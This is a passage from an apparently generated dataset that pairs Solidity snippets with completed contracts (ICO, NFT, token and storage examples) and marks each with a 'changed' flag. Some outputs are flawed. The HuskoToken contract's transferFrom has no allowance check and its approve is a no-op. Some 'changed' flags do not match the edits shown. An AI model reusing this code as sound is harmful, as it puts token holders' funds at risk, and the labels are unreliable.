weeks);\n        ICOState = State.RUNNING;\n    }\n\n    function haltICO() external onlyAdmin {\n        require(ICOState == State.RUNNING, \"ICO isn't running yet\");\n        ICOState = State.HALTED;\n    }\n\n    function resumeICO() external onlyAdmin {\n        require(ICOState == State.HALTED, \"ICO State isn't halted yet\");\n        ICOState = State.RUNNING;\n    }\n\n    function changeICOWallet(address payable _newICOWallet) external onlyAdmin {\n        ICOWallet = _newICOWallet;\n    }\n\n    function changeAdmin(address _newAdmin) external onlyAdmin {\n        admin = _newAdmin;\n    }\n\n    \n    function invest() public payable returns (bool) {\n        require(ICOState == State.RUNNING, \"ICO isn't running\");\n        require(\n            msg.value >= minInvestment && msg.value <= maxInvestment,\n            \"Check Min and Max Investment\"\n        );\n        require(\n            investedAmountOf[msg.sender] + msg.value <= maxInvestment,\n            \"Investor reached maximum Investment Amount\"\n        );\n\n        require(\n            raisedAmount + msg.value <= hardCap,\n            \"Send within hardcap range\"\n        );\n        require(\n            block.timestamp <= icoEndTime,\n            \"ICO already Reached Maximum time limit\"\n        );\n\n        raisedAmount += msg.value;\n        investedAmountOf[msg.sender] += msg.value;\n\n        (bool transferSuccess, ) = ICOWallet.call{value: msg.value}(\"\");\n        require(transferSuccess, \"Failed to Invest\");\n\n        uint tokens = (msg.value / tokenPrice) * 1e18;\n        bool saleSuccess = token.transfer(msg.sender, tokens);\n        require(saleSuccess, \"Failed to Invest\");\n\n        emit Invest(address(this), msg.sender, msg.value, tokens);\n        return true;\n    }\n\n    function burn() external returns (bool) {\n        require(ICOState == State.END, \"ICO isn't over yet\");\n\n        uint remainingTokens = token.balanceOf(address(this));\n        bool success = token.transfer(address(0), remainingTokens);\n        require(success, \"Failed to burn remaining tokens\");\n\n        emit TokenBurn(address(0), remainingTokens, block.timestamp);\n        return true;\n    }\n\n    function endIco() public {\n        require(ICOState == State.RUNNING, \"ICO Should be in Running State\");\n        require(\n            block.timestamp > icoEndTime || raisedAmount >= hardCap,\n            \"ICO Hardcap or timelimit not reached\"\n        );\n        ICOState = State.END;\n    }\n\n    function getICOTokenBalance() external view returns (uint) {\n        return token.balanceOf(address(this));\n    }\n\n    function investorBalanceOf(address _investor) external view returns (uint) {\n        return token.balanceOf(_investor);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n",
        "changed": 1
    },
    "109.sol": {
        "input": "pragma solidity ^0.8.15;\n\ncontract a {\n    bool public recived; \n    function recive2ether() external payable {\n        require(msg.value >= 2 ether);\n        recived = true;\n    }\n}\n\ninterface ainterface {\n    function recive2ether() external payable;\n}\n\ncontract b {\n    ainterface A;\n    constructor (ainterface _A) {\n        A = ainterface(_A);\n    }\n\n    function sendEthtoA() public payable {\n        A.recive2ether{value: msg.value}(); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ainterface {\n    function recive2ether() external payable;\n}\n\ncontract a {\n    bool public recived; \n    function recive2ether() external payable {\n        require(msg.value >= 2 ether, \"Not enough Ether provided.\");\n        recived = true;\n    }\n}\n\ncontract b {\n    ainterface public A;\n    constructor (ainterface _A) {\n        A = _A;\n    }\n\n    function sendEthtoA() public payable {\n        require(msg.value > 0, \"No Ether provided.\");\n        A.recive2ether{value: msg.value}(); \n    }\n}\n\n",
        "changed": 0
    },
    "112.sol": {
        "input": "contract CommitteePrecompiled {\n    struct Node {\n    }\n    mapping (address => Node[]) userNodes;\n\n    function RegisterNode() public {\n        Node memory node = Node(\n);\n        userNodes[msg.sender].push(node);\n    }\n\n    function QueryState()   public view returns(string memory, int ) {\n    }\n\n}\n\n\n",
        "output": "contract CommitteePrecompiled {\n    struct Node {\n        // TODO params\n    }\n    mapping (address => Node[]) userNodes;\n\n    function RegisterNode() public {\n        Node memory node = Node(/* TODO params */);\n        userNodes[msg.sender].push(node);\n    }\n\n    function QueryState()   public view returns(string memory, int ) {\n        // TODO your code to retrieve the state and return a `string` and an `int`\n    }\n\n    // TODO implement all your functions\n}\n\n",
        "changed": 0
    },
    "114.sol": {
        "input": "function _beforeTokenTransfer(\n    address from,\n    address to,\n    uint256 firstTokenId,\n    uint256 batchSize\n) internal virtual override (ERC721, ERC721Enumerable, ERC721Pausable) {\n    super._beforeTokenTransfer(from, to, firstTokenId, batchSize);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "116.sol": {
        "input": "constructor() {\n        i_owner = msg.sender; \n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public i_owner;\n\n    constructor() public {\n        i_owner = msg.sender; \n    }\n}\n\n",
        "changed": 1
    },
    "117.sol": {
        "input": "contract CarShop {\n    address owner;\n    uint256 toyotaCount;\n    uint256 audiCount;\n    uint256 bmwCount;\n\n    Cars public toyota;\n    Cars public audi;\n    Cars public bmw;\n\n    enum CarType {Toyota, Audi, Bmw}\n    struct Cars {\n        CarType carType;\n        uint count;\n    }\n\n    constructor(uint256 _toyotaCount, uint256 _audiCount, uint256 _bmwCount) {\n        owner = msg.sender;\n        toyotaCount = _toyotaCount;\n        audiCount = _audiCount;\n        bmwCount = _bmwCount;\n\n        toyota = Cars(CarType.Toyota, _toyotaCount);\n        audi = Cars(CarType.Audi, _audiCount);\n        bmw = Cars(CarType.Bmw, _bmwCount);\n    }\n\n    \n    function addCarCount(CarType _carType, uint256 _count) public {\n        require(msg.sender == owner, \"Only owner can add car count\");\n        if(_carType == CarType.Toyota) {\n            toyota.count += _count;\n        } else if(_carType == CarType.Audi) {\n            audi.count += _count;\n        } else if(_carType == CarType.Bmw) {\n            bmw.count += _count;\n        }\n    }\n}\n\nimport { ethers } from \"hardhat\";\n\nasync function main() {\n    const [owner] = await ethers.getSigners();\n\n    const contractAddress = process.env.CAR_CONTRACT_ADDRESS;\n\n    const contract = await ethers.getContractFactory(\"CarShop\");\n    const contractInstance = await contract.attach(`${contractAddress}`);\n\n    const audi = await contractInstance.audi();\n    console.log(audi);\n\n    await contractInstance.connect(owner).addCarCount(1, 3);\n\n    const audiAfter = await contractInstance.audi();\n    console.log(audiAfter);\n}\n\nmain().catch((error) => {\n    console.error(error);\n    process.exitCode = 1;\n});\n\n[\n  1,\n  BigNumber { value: \"10\" },\n  carType: 1,\n  count: BigNumber { value: \"10\" }\n]\n[\n  1,\n  BigNumber { value: \"13\" },\n  carType: 1,\n  count: BigNumber { value: \"13\" }\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CarShop {\n    address public owner;\n    uint256 public toyotaCount;\n    uint256 public audiCount;\n    uint256 public bmwCount;\n\n    Cars public toyota;\n    Cars public audi;\n    Cars public bmw;\n\n    enum CarType {Toyota, Audi, Bmw}\n    struct Cars {\n        CarType carType;\n        uint count;\n    }\n\n    constructor(uint256 _toyotaCount, uint256 _audiCount, uint256 _bmwCount) {\n        owner = msg.sender;\n        toyotaCount = _toyotaCount;\n        audiCount = _audiCount;\n        bmwCount = _bmwCount;\n\n        toyota = Cars(CarType.Toyota, _toyotaCount);\n        audi = Cars(CarType.Audi, _audiCount);\n        bmw = Cars(CarType.Bmw, _bmwCount);\n    }\n\n\n    function addCarCount(CarType _carType, uint256 _count) public {\n        require(msg.sender == owner, \"Only owner can add car count\");\n        if(_carType == CarType.Toyota) {\n            toyota.count += _count;\n        } else if(_carType == CarType.Audi) {\n            audi.count += _count;\n        } else if(_carType == CarType.Bmw) {\n            bmw.count += _count;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "118.sol": {
        "input": "bytes memory payload = abi.encodeWithSignature(\"setApprovalForAll(address,bool)\", address(this), true);\n(bool success,) = address(_contract).delegatecall(payload);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address _contract;\n\n    constructor(address contractAddress) {\n        _contract = contractAddress;\n    }\n\n    function delegatecallSetApprovalForAll() public {\n        bytes memory payload = abi.encodeWithSignature(\"setApprovalForAll(address,bool)\", address(this), true);\n        (bool success,) = address(_contract).delegatecall(payload);\n\n        require(success, \"Delegatecall has failed\");\n    }\n}\n\n",
        "changed": 1
    },
    "119.sol": {
        "input": "let signedMessage = `\\x19Ethereum Signed Message:\\n${signedMessage.length}${message}`;\n\nfunction getSigner(string memory message, bytes memory sig) public view returns(address) {\n   bytes32 messageHash = keccak256(abi.encodePacked(message));\n   address signer = ECDSA.recover(messageHash, sig);\n   return signer;\n}\n\nlet prefixedMessage = `\\x19Ethereum Signed Message:\\n${message.length}${message}`\n  address = await mycontract.getSigner(prefixedMessage, signature);\n\n\n",
        "output": "",
        "changed": 0
    },
    "120.sol": {
        "input": "modifier onlyAllowedUsers {\n  require(validUser[msg.sender] || admin == msg.sender, \"Error Message\");\n  _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => bool) public validUser;\n    address public admin;\n\n    constructor() public {\n        admin = msg.sender; // Set the admin to the account that deploys the contract\n    }\n\n    modifier onlyAllowedUsers {\n        require(validUser[msg.sender] || admin == msg.sender, \"Error Message\");\n        _;\n    }\n\n    function addUser(address _user) public onlyAllowedUsers {\n        validUser[_user] = true;\n    }\n\n    function removeUser(address _user) public onlyAllowedUsers {\n        validUser[_user] = false;\n    }\n}\n\n",
        "changed": 0
    },
    "122.sol": {
        "input": "function setStudentRecords(string calldata _name, string calldata _address, string calldata _phoneNumber, uint16 _rollNumber,\n                              string calldata _DOB, uint8 _sem, uint8 _CGPA, string calldata _UniName) public\n{\n    StudentRecord.push(  \n        student(         \n            _name,\n            _address,\n            _phoneNumber,\n            _rollNumber,\n            _DOB,\n            _sem,\n            _CGPA,\n            _UniName\n        )\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract StudentRecords {\n    struct Student {\n        string name;\n        string addr;\n        string phoneNumber;\n        uint16 rollNumber;\n        string DOB;\n        uint8 sem;\n        uint8 CGPA;\n        string UniName;\n    }\n\n    Student[] public StudentRecord;\n\n    function setStudentRecords(string calldata _name, string calldata _address, string calldata _phoneNumber, uint16 _rollNumber,\n                              string calldata _DOB, uint8 _sem, uint8 _CGPA, string calldata _UniName) public\n    {\n        StudentRecord.push(Student(         \n            _name,\n            _address,\n            _phoneNumber,\n            _rollNumber,\n            _DOB,\n            _sem,\n            _CGPA,\n            _UniName\n        ));\n    }\n}\n\n",
        "changed": 0
    },
    "123.sol": {
        "input": "if (address(attr).code.length == 0) {\n    return;\n}\n\ntry attr.maybedoesntexist() {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Attr {\n        address addr;\n    }\n\n    Attr public attr;\n\n    function setAttrAddress(address _address) public {\n        attr.addr = _address;\n    }\n\n    function checkAttr() public view returns (bool){\n        if (attr.addr.code.length == 0) {\n            return false;\n        }\n        return true;\n    }\n    \n    function maybeDoesntExist() external view returns (bool){\n        try this.checkAttr() {\n            return true;\n        }\n        catch {\n            return false;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "124.sol": {
        "input": "function getTodo(string memory _name, uint _age) external pure returns(Todo memory) {\n        Todo memory myTodo = Todo(_name, _age);\n        return myTodo;\n}\n\npragma solidity ^0.8.0;\n\ncontract Test {\n    \n    struct Todo {\n        string name;\n        uint age;\n    }\n\n    Todo[] todoArray;\n\n    function createTodo(string memory _name, uint _age) public {\n        todoArray.push(Todo(_name, _age));\n    }\n\n    function getTodo(uint _index) external view returns(Todo memory) {\n        return todoArray[_index];\n    }\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    \n    struct Todo {\n        string name;\n        uint age;\n    }\n\n    Todo[] private todoArray;\n\n    function createTodo(string memory _name, uint _age) public {\n        Todo memory newTodo = Todo(_name, _age);\n        todoArray.push(newTodo);\n    }\n\n    function getTodo(uint _index) external view returns(string memory, uint) {\n        Todo memory todo = todoArray[_index];\n        return (todo.name, todo.age);\n    }\n\n    function getTodoByNameAndAge(string memory _name, uint _age) external view returns(Todo memory) {\n        for(uint i=0; i<todoArray.length; i++){\n            if(keccak256(abi.encodePacked(todoArray[i].name)) == keccak256(abi.encodePacked(_name)) && todoArray[i].age == _age){\n                return todoArray[i];\n            }\n        }\n        revert(\"Todo not found\");\n    }\n}\n",
        "changed": 1
    },
    "125.sol": {
        "input": "function callAnotherContract() external {\n    address anotherContract = address(0x123);\n    bytes memory data = hex\"7a1eb1b900\";\n    uint256 myValue = 0;\n    uint256 myGasLimit = 100000;\n\n    anotherContract.call{value: myValue, gas: myGasLimit}(data);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function callAnotherContract() external {\n        address anotherContract = address(0x123);\n        bytes memory data = hex\"7a1eb1b900\";\n        uint256 myValue = 0;\n        uint256 myGasLimit = 100000;\n\n        (bool success,) = anotherContract.call{value: myValue, gas: myGasLimit}(data);\n        require(success, \"Failed to call anotherContract\");\n    }\n}\n\n",
        "changed": 1
    },
    "126.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n  struct Strings {\n    string[] s;\n  }\n\n  function foo() external pure {\n    Strings[] memory strings = new Strings[](2);\n\n    strings[0].s = new string[](2);\n    strings[0].s[0] = \"a\";\n    strings[0].s[1] = \"b\";\n\n    strings[1].s = new string[](3);\n    strings[1].s[0] = \"a\";\n    strings[1].s[1] = \"b\";\n    strings[1].s[1] = \"c\";\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n  struct Strings {\n    string[] s;\n  }\n\n  function foo() external pure {\n    Strings[] memory strings = new Strings[](2);\n\n    strings[0].s = new string[](2);\n    strings[0].s[0] = \"a\";\n    strings[0].s[1] = \"b\";\n\n    strings[1].s = new string[](3);\n    strings[1].s[0] = \"a\";\n    strings[1].s[1] = \"b\";\n    strings[1].s[1] = \"c\";\n  }\n}\n\n",
        "changed": 0
    },
    "127.sol": {
        "input": "function createNFT() public returns(bytes32){\n        getMintedAddress[indexForSenders]=msg.sender;\n        indexForSenders+=1\n        .....\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTContract {\n    // Mapping to store minted addresses\n    mapping(uint => address) public getMintedAddress;\n    uint public indexForSenders;\n\n    constructor() public {\n        indexForSenders = 0;\n    }\n\n    // Function to create an NFT\n    function createNFT() public returns(bytes32) {\n        getMintedAddress[indexForSenders]=msg.sender;\n        indexForSenders += 1;\n        \n        // Assuming the NFT is a hash of the sender and the index\n        bytes32 NFT = keccak256(abi.encodePacked(msg.sender, indexForSenders));\n        \n        return NFT;\n    }\n}\n\n",
        "changed": 0
    },
    "128.sol": {
        "input": "function test_storage(string storage _data) public {\n  data = _data;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n    string public data;\n\n    function test_storage(string memory _data) public {\n        data = _data;\n    }\n}\n\n",
        "changed": 0
    },
    "129.sol": {
        "input": "1101 << 4:\n1010\n0100\n1000\n0000\n\nentryRange |= uint224(ref.entryCount)<<160;\nentryRange |= uint224(ref.entryCount + amount)<<192;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SmartContract {\n    struct Reference {\n        uint224 entryCount;\n    }\n    \n    Reference ref;\n    uint224 entryRange;\n    \n    constructor() {\n        ref.entryCount = 0;\n        entryRange = 0;\n    }\n    \n    function updateEntry(uint224 amount) public {\n        entryRange |= uint224(ref.entryCount)<<160;\n        entryRange |= uint224(ref.entryCount + amount)<<192;\n        ref.entryCount += amount;\n    }\n}\n\n",
        "changed": 1
    },
    "130.sol": {
        "input": "\n pragma solidity >=0.6.0;\n\n import \"./1_Storage.sol\";\n\n contract StorageFactory {\n\n      function createsimplestoragecontract() public {\n           Storage _simplestorage = new Storage();\n      }\n\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Storage {\n    uint256 public data;\n\n    function set(uint256 x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint256) {\n        return data;\n    }\n}\n\ncontract StorageFactory {\n    address public simpleStorageAddress;\n\n    function createSimpleStorageContract() public {\n        Storage _simpleStorage = new Storage();\n        simpleStorageAddress = address(_simpleStorage);\n    }\n\n    function getSimpleStorageContract() public view returns (address) {\n        return simpleStorageAddress;\n    }\n}\n\n",
        "changed": 0
    },
    "131.sol": {
        "input": "uint key = \"abc\";\nmyMap[key] = 123;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(uint => uint) public myMap;\n\n    constructor() public {\n        uint key = uint(keccak256(abi.encodePacked(\"abc\")));\n        myMap[key] = 123;\n    }\n}\n\n",
        "changed": 0
    },
    "132.sol": {
        "input": "function getNftTokenHolder(address _nft, unit _tokenIds) public returns (address[]) {\n    address[] memory addr = new address[](_tokenIds);\n    for (uint i; i < _tokenIds; i++) {\n        addr[i] = INft(_nft).ownerOf(i);\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface INft {\n    function ownerOf(uint256 tokenId) external view returns (address);\n}\n\ncontract MyContract {\n    function getNftTokenHolder(address _nft, uint _tokenIds) public view returns (address[] memory) {\n        address[] memory addr = new address[](_tokenIds);\n        for (uint i; i < _tokenIds; i++) {\n            addr[i] = INft(_nft).ownerOf(i);\n        }\n        return addr;\n    }\n}\n\n",
        "changed": 0
    },
    "133.sol": {
        "input": "function selectWinner() public {\n    require(msg.sender==manager);\n    require(participants.length>=3);\n    uint r=random();  \n    uint index=r % participants.length; \n    address payable winner;\n    winner=participants[index];\n    uint balance = getBalance(); \n    uint fee = balance * 0.01 ether; \n    uint amountToTransfer = balance - fee;\n    winner.transfer(amountToTransfer);\n    _withdrawFee(fee); \n    participants=new address payable[](0);\n}\n\nfunction _withdrawFee(uint feeAmount) payable private {\n    msg.sender.transfer(feeAmount);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "135.sol": {
        "input": "    function callMint(address tokenAddress, Param param) external {\n        address _owner = param.owner;\n        uint256 _amount = param.amount;\n        bytes4 _selector = 0x40c10f19;  \n        assembly {\n            let calldataOffset := mload(0x40)\n            \n            mstore(0x40, add(calldataOffset, 0x44))\n            \n            mstore(calldataOffset, _selector)\n            mstore(add(calldataOffset, 0x04), _owner)\n            mstore(add(calldataOffset, 0x24), _amount)\n            \n            let result := call(\n                gas(),\n                tokenAddress,\n                0,               \n                calldataOffset,\n                0x44,\n                0,               \n                0                \n            )\n            \n            if eq(result, 0) {\n                returndatacopy(0, 0, returndatasize())\n                revert(0, returndatasize())\n            }\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Param {\n        address owner;\n        uint256 amount;\n    }\n\n    function callMint(address tokenAddress, Param memory param) external {\n        address _owner = param.owner;\n        uint256 _amount = param.amount;\n        bytes4 _selector = 0x40c10f19;\n        assembly {\n            let calldataOffset := mload(0x40)\n            \n            mstore(0x40, add(calldataOffset, 0x44))\n            \n            mstore(calldataOffset, _selector)\n            mstore(add(calldataOffset, 0x04), _owner)\n            mstore(add(calldataOffset, 0x24), _amount)\n            \n            let result := call(\n                gas(),\n                tokenAddress,\n                0,               \n                calldataOffset,\n                0x44,\n                0,               \n                0                \n            )\n            \n            if eq(result, 0) {\n                returndatacopy(0, 0, returndatasize())\n                revert(0, returndatasize())\n            }\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "136.sol": {
        "input": "                    if (x < sellSymbols.length) {\n                        sellSymbols[x] = sellSymbols[sellSymbols.length - 1];\n                        delete sellSymbols[myArray.length - 1];\n                        sellSymbols.length--;\n                    } else {\n                        delete sellSymbols;\n                    }\n\nfunction except(string _item, mapping(string => bool) _ownedSymbols, mapping(string => bool) _targetAssets) internal returns (bool) {\n    return _ownedSymbols[_item] && !_targetAssets[_item];\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string[] public sellSymbols;\n    \n    mapping(string => bool) public ownedSymbols;\n    mapping(string => bool) public targetAssets;\n\n    function sellSymbol(uint x) public {\n        if (x < sellSymbols.length) {\n            sellSymbols[x] = sellSymbols[sellSymbols.length - 1];\n            sellSymbols.pop();\n        } else {\n            delete sellSymbols;\n        }\n    }\n\n    function except(string memory _item) internal view returns (bool) {\n        return ownedSymbols[_item] && !targetAssets[_item];\n    }\n}\n\n",
        "changed": 0
    },
    "137.sol": {
        "input": "const huskoToken = await HuskoToken.deploy(\n    supply.toLocaleString('fullwide', {useGrouping:false}),\n    fee,\n    feeTaker,\n    maxSupply.toLocaleString('fullwide', {useGrouping:false})\n);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract HuskoToken {\n    string public name = \"HuskoToken\";\n    string public symbol = \"HUSKO\";\n    uint256 public totalSupply;\n    address public feeTaker;\n    uint256 public fee;\n    uint256 public maxSupply;\n\n    mapping(address => uint256) public balanceOf;\n\n    constructor(uint256 _initialSupply, uint256 _fee, address _feeTaker, uint256 _maxSupply) public {\n        totalSupply = _initialSupply;\n        fee = _fee;\n        feeTaker = _feeTaker;\n        maxSupply = _maxSupply;\n        balanceOf[msg.sender] = _initialSupply;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n\n    function approve(address _spender, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value);\n        return true;\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[_from] >= _value);\n        balanceOf[_from] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "138.sol": {
        "input": "function expand(\n    uint256 randomValue, \n    uint256 n\n) public pure returns (uint256[] memory expandedValues) {\n    expandedValues = new uint256[](n);\n    for (uint256 i = 0; i < n; i++) {\n        expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n    }\n    return expandedValues;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Expand {\n    function expand(\n        uint256 randomValue, \n        uint256 n\n    ) public pure returns (uint256[] memory expandedValues) {\n        expandedValues = new uint256[](n);\n        for (uint256 i = 0; i < n; i++) {\n            expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n        }\n        return expandedValues;\n    }\n}\n\n",
        "changed": 0
    },
    "139.sol": {
        "input": "uint256 public mintCost = 0.05 ether;\n\nfunction setCost(uint256 _newCost) public onlyOwner {\n        mintCost = _newCost;\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public mintCost = 0.05 ether;\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only contract owner can call this function\");\n        _;\n    }\n\n    function setCost(uint256 _newCost) public onlyOwner {\n        mintCost = _newCost;\n    }\n}\n\n",
        "changed": 0
    },
    "140.sol": {
        "input": "pragma solidity ^0.8.9;\n\ncontract Lock {\n\n    event DataStoredNonAnonymous(address admin, uint256 indexed data);\n    event DataStoredAnonymous(address admin, uint256 indexed data) anonymous;\n   \n    uint256 x;\n    uint256 y;\n   \n    function storeDataNonAnonymous(uint256 _data) external {\n      x = _data;\n      emit DataStoredNonAnonymous(msg.sender, _data);\n    }\n\n    function storeDataAnonymous(uint256 _data) external {\n      y = _data;\n      emit DataStoredAnonymous(msg.sender, _data);\n    }\n\n}\n\nimport { ethers } from \"hardhat\";\n\nasync function main() {\n  const Lock = await ethers.getContractFactory(\"Lock\");\n  const lock = await Lock.deploy();\n\n  await lock.deployed();\n\n  console.log(`deployed to ${lock.address}`);\n  const tx1 = await lock.storeDataNonAnonymous(10);\n  const txReceipt1 = await tx1.wait()\n  console.log(\"event non-anonymous\",txReceipt1.events)\n\n  const tx2 = await lock.storeDataAnonymous(12345);\n  const txReceipt2 = await tx2.wait()\n  console.log(\"event anonymous\",txReceipt2.events)\n\n}\n\nmain().catch((error) => {\n  console.error(error);\n  process.exitCode = 1;\n});\n\nCompiled 1 Solidity file successfully\ndeployed to 0x5FbDB2315678afecb367f032d93F642f64180aa3\nevent non-anonymous [\n  {\n    transactionIndex: 0,\n    blockNumber: 2,\n    transactionHash: '0x22e2b2c6274a83e0c6ff9e2733e7875940e038f3faf5641d77ede41958657fa0',\n    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',\n    topics: [\n      '0xe70463dc16bf49899544f11b2caa7874683dbf886102edb6cbc82d728dc425d4',\n      '0x000000000000000000000000000000000000000000000000000000000000000a'\n    ],\n    data: '0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266',\n    logIndex: 0,\n    blockHash: '0x1491b08df4abb9ac8aaeb3be796ab0635957668224470944fd215400a02ce276',\n    args: [\n      '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',\n      BigNumber { value: \"10\" },\n      admin: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',\n      data: BigNumber { value: \"10\" }\n    ],\n    decode: [Function (anonymous)],\n    event: 'DataStoredNonAnonymous',\n    eventSignature: 'DataStoredNonAnonymous(address,uint256)',\n    removeListener: [Function (anonymous)],\n    getBlock: [Function (anonymous)],\n    getTransaction: [Function (anonymous)],\n    getTransactionReceipt: [Function (anonymous)]\n  }\n]\nevent anonymous [\n  {\n    transactionIndex: 0,\n    blockNumber: 3,\n    transactionHash: '0x76ec1eef5693031441fd0446ab681d3f703cca3a016167b343ad8d75fdfd478f',\n    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',\n    topics: [\n      '0x0000000000000000000000000000000000000000000000000000000000003039'\n    ],\n    data: '0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266',\n    logIndex: 0,\n    blockHash: '0xd4f64019225eb982522f8f41a1cc2d6869a7ac41f5d93e5b6f7fb39607914e78',\n    removeListener: [Function (anonymous)],\n    getBlock: [Function (anonymous)],\n    getTransaction: [Function (anonymous)],\n    getTransactionReceipt: [Function (anonymous)]\n  }\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lock {\n\n    event DataStoredNonAnonymous(address admin, uint256 indexed data);\n    event DataStoredAnonymous(address admin, uint256 indexed data) anonymous;\n   \n    uint256 x;\n    uint256 y;\n   \n    function storeDataNonAnonymous(uint256 _data) external {\n      x = _data;\n      emit DataStoredNonAnonymous(msg.sender, _data);\n    }\n\n    function storeDataAnonymous(uint256 _data) external {\n      y = _data;\n      emit DataStoredAnonymous(msg.sender, _data);\n    }\n\n}\n\n",
        "changed": 0
    },
    "141.sol": {
        "input": "ParserError: Function, variable, struct or modifier declaration expected.\n  --> stable coin lil.sol:54:1:\n   |\n54 | \n   | ^\n\nfunction marketing(uint256 amount) public onlyOwner {\n  uint256 marketingTaxAmount = amount.mul(MARKETING_TAX).div(100);\n\n  _transfer(address(this), _msgSender(), marketingTaxAmount);\n} \n\n\n",
        "output": "",
        "changed": 0
    },
    "142.sol": {
        "input": "  uint public listingPrice=0.025 ether;\n\nrequire(msg.value==listingPrice,\"Price must be equal to listing fee\");\n\nfunction setListingPrice(uint newPrice) external onlyOwner{\n    require(newPrice>0,\"Price must be at least 1 wei\");\n    listingPrice=newPrice;\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ListingContract {\n    uint public listingPrice = 0.025 ether;\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n    \n    modifier onlyOwner {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    function setListingPrice(uint newPrice) external onlyOwner {\n        require(newPrice > 0,\"Price must be at least 1 wei\");\n        listingPrice = newPrice;\n    }\n\n    function buyListing() public payable {\n        require(msg.value == listingPrice,\"Price must be equal to listing fee\");\n        // Here you can add the functionality of what happens after a successful purchase\n    }\n}\n\n",
        "changed": 0
    },
    "143.sol": {
        "input": "mapping(address => uint) public balanceOf;\n\n    uint balance0 = IERC20(token0).balanceOf(address(this));\n    uint balance1 = IERC20(token1).balanceOf(address(this));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract MyContract {\n    IERC20 public token0;\n    IERC20 public token1;\n\n    mapping(address => uint) public balanceOf;\n\n    constructor(address _token0, address _token1) public {\n        token0 = IERC20(_token0);\n        token1 = IERC20(_token1);\n    }\n\n    function checkBalances() public view returns (uint256, uint256) {\n        uint balance0 = token0.balanceOf(address(this));\n        uint balance1 = token1.balanceOf(address(this));\n        return (balance0, balance1);\n    }\n}\n\n",
        "changed": 0
    },
    "144.sol": {
        "input": "constructor(address _tokenAddress) public {\n  token = IERC20(_tokenAddress);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    function balanceOf(address who) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract MyContract {\n    IERC20 public token;\n\n    constructor(address _tokenAddress) public {\n        token = IERC20(_tokenAddress);\n    }\n\n    function myFunction() public {\n        // Add your code here\n    }\n}\n\n",
        "changed": 0
    },
    "145.sol": {
